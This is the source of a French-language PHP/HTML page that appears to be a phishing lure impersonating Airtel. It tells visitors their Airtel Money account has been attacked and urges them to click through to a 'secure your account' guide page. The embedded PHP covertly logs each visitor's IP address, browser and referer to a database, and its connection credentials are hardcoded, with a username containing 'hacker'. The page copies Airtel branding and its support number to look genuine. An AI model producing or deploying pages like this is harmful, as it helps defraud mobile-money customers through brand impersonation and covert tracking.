<?php
// --- Configuration de la base de données ---
define('DB_HOST', 'localhost');
define('DB_NAME', 'ONLY.NBA');
define('DB_USER', 'nathanaelhacker6NBA');
define('DB_PASS', 'nathanael1209ba');

// --- Partie PHP pour l'enregistrement des logs dans la base de données ---
try {
    $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
    $pdo = new PDO($dsn, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Récupérer des informations sur le visiteur
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN_USER_AGENT';
    $referer = $_SERVER['HTTP_REFERER'] ?? null; // Utilisez null si le referer n'existe pas

    // Préparer la requête SQL d'insertion
    $stmt = $pdo->prepare("INSERT INTO site_visitors (ip_address, user_agent, referer) VALUES (:ip_address, :user_agent, :referer)");

    // Exécuter la requête avec les données
    $stmt->execute([
        ':ip_address' => $ipAddress,
        ':user_agent' => $userAgent,
        ':referer' => $referer
    ]);

} catch (PDOException $e) {
    // En cas d'erreur de connexion ou d'insertion, enregistrez l'erreur discrètement.
    // N'affichez PAS l'erreur à l'utilisateur final pour des raisons de sécurité.
    error_log("[" . date('Y-m-d H:i:s') . "] Site Visitor Log Error: " . $e->getMessage() . " | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n", 3, 'site_visitor_errors.log');
    // Vous pouvez aussi afficher un message générique si vous voulez être sûr, mais c'est moins bon pour l'expérience utilisateur
    // echo "Une erreur est survenue lors de l'enregistrement de votre visite.";
}

// --- Fin de la partie PHP pour l'enregistrement des logs ---
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtel | Aide Compte Attaqué</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        /* Personnalisation de la police pour un aspect plus moderne et lisible */
        body {
            font-family: 'Inter', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        /* Définir une couleur rouge Airtel personnalisée pour une fidélité maximale à la marque */
        .airtel-red-500 {
            background-color: #E4002B; /* Un rouge vibrant et spécifique à Airtel */
        }
        .airtel-red-600 {
            background-color: #B00021; /* Une version plus foncée pour le survol et les bordures */
        }
        .airtel-text-red-500 {
            color: #E4002B;
        }
        .airtel-border-red-500 {
            border-color: #E4002B;
        }

        /* Animation d'apparition douce pour le contenu principal */
        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        .animate-fadeInScale {
            animation: fadeInScale 0.7s ease-out forwards;
        }

        /* Effet de brillance subtile sur les boutons */
        .shine-effect {
            position: relative;
            overflow: hidden;
        }
        .shine-effect::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -60%;
            width: 30%;
            height: 200%;
            background: rgba(255, 255, 255, 0.15);
            transform: rotate(30deg);
            transition: all 0.5s ease-in-out;
            opacity: 0;
        }
        .shine-effect:hover::after {
            left: 100%;
            opacity: 1;
        }

        /* Styles génériques pour les éléments interactifs au focus */
        input:focus, button:focus, select:focus, a:focus {
            outline: none !important;
            border-color: #E4002B !important; /* Couleur de bordure Airtel au focus */
            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important; /* Ombre de focus Airtel */
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen py-8 px-4 sm:px-6 lg:px-8">
    <div class="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 md:p-12 w-full max-w-md lg:max-w-4xl mx-auto border-t-8 border-airtel-red-500 transform scale-100 transition-all duration-300 ease-in-out hover:scale-[1.01] animate-fadeInScale">
        <header class="text-center mb-10">
            <img src="images/airtel.jpg" alt="Logo Airtel" class="h-28 sm:h-32 lg:h-40 mx-auto mb-6 drop-shadow-md transform hover:scale-105 transition duration-300 ease-in-out" onerror="this.onerror=null;this.src='https://placehold.co/300x120/E4002B/FFFFFF?text=AIRTEL';">

            <h1 class="text-4xl sm:text-5xl md:text-6xl font-extrabold airtel-text-red-500 mb-4 leading-tight drop-shadow-lg">
                Votre Compte Airtel a été Attaqué.
            </h1>
            <p class="text-gray-800 text-lg sm:text-xl md:text-2xl mb-5 font-semibold leading-relaxed">
                Nous sommes là pour vous aider rapidement et en toute sécurité.
            </p>
            <p class="text-gray-600 text-base sm:text-lg md:text-xl max-w-2xl mx-auto leading-relaxed">
                Afin de protéger vos informations et vos fonds, veuillez suivre les étapes ci-dessous pour sécuriser votre compte Airtel Money.
            </p>
        </header>

        <div id="action-button" class="flex justify-center mt-8">
            <a href="airtel-money-guide.html" class="block airtel-red-500 text-white text-center font-extrabold py-5 px-8 rounded-full text-xl sm:text-2xl uppercase tracking-wide hover:airtel-red-600 transition duration-300 shadow-xl border-b-4 border-airtel-red-600 transform hover:-translate-y-1 active:scale-98 focus:outline-none focus:ring-4 focus:ring-red-300 focus:ring-opacity-75 shine-effect max-w-md">
                Sécuriser Mon Compte Airtel Money
            </a>
        </div>

        <div class="mt-12 text-center text-gray-700">
            <h3 class="text-2xl font-bold mb-4 airtel-text-red-500">Que faire si mon compte est compromis ?</h3>
            <p class="text-md sm:text-lg max-w-2xl mx-auto">
                Si vous avez des raisons de croire que votre compte Airtel Money a été utilisé de manière non autorisée, il est crucial d'agir immédiatement. Notre service client est disponible 24h/24 et 7j/7 pour vous assister. Vous pouvez les contacter au <span class="font-bold airtel-text-red-500">111</span> ou via l'application Airtel Money.
            </p>
            <div class="flex justify-center gap-6 mt-8">
                <a href="tel:111" class="flex items-center text-gray-600 hover:text-airtel-text-red-500 transition duration-200">
                    <i class="fas fa-headset text-2xl mr-2"></i>
                    <span class="font-semibold">Support Client</span>
                </a>
                <a href="#" class="flex items-center text-gray-600 hover:text-airtel-text-red-500 transition duration-200">
                    <i class="fas fa-info-circle text-2xl mr-2"></i>
                    <span class="font-semibold">En savoir plus</span>
                </a>
            </div>
        </div>

        <footer class="text-center mt-12 text-gray-500 text-sm">
            <p>&copy; <?php echo date("Y"); ?> Airtel. Tous droits réservés. <br> La protection de votre compte est notre priorité.</p>
        </footer>
    </div>
</body>
</html>
